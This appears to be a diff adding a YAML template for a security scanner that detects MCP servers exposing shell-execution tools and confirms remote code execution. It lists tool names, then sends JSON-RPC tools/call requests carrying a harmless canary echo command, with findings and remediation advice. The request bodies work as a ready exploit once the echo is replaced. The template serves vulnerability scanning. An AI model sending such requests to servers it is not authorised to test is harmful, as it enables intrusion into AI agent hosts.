@@ -1,0 +1,126 @@
+id: mcp-cmdi-001-execute-command-rce
+transport: mcp
+info:
+  name: "MCP Server - Command Injection via Execute Tool"
+  type: exploit
+  severity: critical
+  author: aipostex
+  description: |
+    MCP server exposes a command execution tool (execute_command, run_command,
+    or shell_exec) that passes user input directly to the operating system
+    shell without sanitization. Any network client can execute arbitrary
+    commands on the host as the MCP server process user.
+
+    This is the most dangerous class of MCP tool vulnerability — it provides
+    immediate remote code execution without authentication.
+  reference:
+    - https://vulnerablemcp.info/
+    - https://equixly.com/blog/2025/03/29/mcp-server-new-security-nightmare/
+  tags: [mcp, command-injection, rce]
+  classification:
+    mitre-atlas: [AML.T0049]
+
+detect:
+  - method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/list","id":1}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_regex
+        value: "(execute_command|run_command|shell_exec|exec_command)"
+
+checks:
+  - name: "Command execution tool available"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/list","id":1}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_regex
+        value: "(execute_command|run_command|shell_exec|exec_command)"
+    extractors:
+      - type: json
+        name: tool_names
+        path: "result.tools.#.name"
+    severity: high
+    stage: access
+    landed: reachable
+    finding:
+      title: "MCP Server Exposes Command Execution Tool"
+      description: "MCP server exposes a command execution tool among: {{tool_names}}. If unsanitized, this enables remote code execution."
+      remediation: "Remove or sandbox command execution tools. Implement input validation, allowlists, and least-privilege execution contexts."
+
+  - name: "RCE confirmed via execute_command"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"execute_command","arguments":{"command":"echo AIPOSTEX_RCE_CANARY_7f3a9b2e"}},"id":2}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_contains
+        value: "AIPOSTEX_RCE_CANARY_7f3a9b2e"
+    severity: critical
+    stage: impact
+    landed: execution-confirmed
+    finding:
+      title: "MCP Command Injection: RCE Confirmed via execute_command"
+      description: "Arbitrary command execution confirmed. The execute_command tool passes input directly to the OS shell. A canary echo command was executed and its output returned in the response."
+      remediation: "Remove the execute_command tool or replace with a sandboxed implementation that validates commands against an allowlist. Bind MCP server to localhost and add authentication."
+      evidence: |
+        Payload:  tools/call execute_command {"command":"echo AIPOSTEX_RCE_CANARY_7f3a9b2e"}
+        Result:   Canary string returned in response body
+        Impact:   Arbitrary OS command execution as MCP server process user
+
+  - name: "RCE confirmed via run_command"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"run_command","arguments":{"command":"echo AIPOSTEX_RCE_CANARY_7f3a9b2e"}},"id":3}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_contains
+        value: "AIPOSTEX_RCE_CANARY_7f3a9b2e"
+    severity: critical
+    stage: impact
+    landed: execution-confirmed
+    finding:
+      title: "MCP Command Injection: RCE Confirmed via run_command"
+      description: "Arbitrary command execution confirmed via the run_command tool. Input is passed unsanitized to the OS shell."
+      remediation: "Remove the run_command tool or implement strict input validation. Bind MCP server to localhost and add authentication."
+      evidence: |
+        Payload:  tools/call run_command {"command":"echo AIPOSTEX_RCE_CANARY_7f3a9b2e"}
+        Result:   Canary string returned in response body
+        Impact:   Arbitrary OS command execution as MCP server process user
+
+  - name: "RCE confirmed via shell_exec"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"shell_exec","arguments":{"command":"echo AIPOSTEX_RCE_CANARY_7f3a9b2e"}},"id":4}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_contains
+        value: "AIPOSTEX_RCE_CANARY_7f3a9b2e"
+    severity: critical
+    stage: impact
+    landed: execution-confirmed
+    finding:
+      title: "MCP Command Injection: RCE Confirmed via shell_exec"
+      description: "Arbitrary command execution confirmed via the shell_exec tool. Input is passed unsanitized to the OS shell."
+      remediation: "Remove the shell_exec tool or implement strict input validation. Bind MCP server to localhost and add authentication."
+      evidence: |
+        Payload:  tools/call shell_exec {"command":"echo AIPOSTEX_RCE_CANARY_7f3a9b2e"}
+        Result:   Canary string returned in response body
+        Impact:   Arbitrary OS command execution as MCP server process user
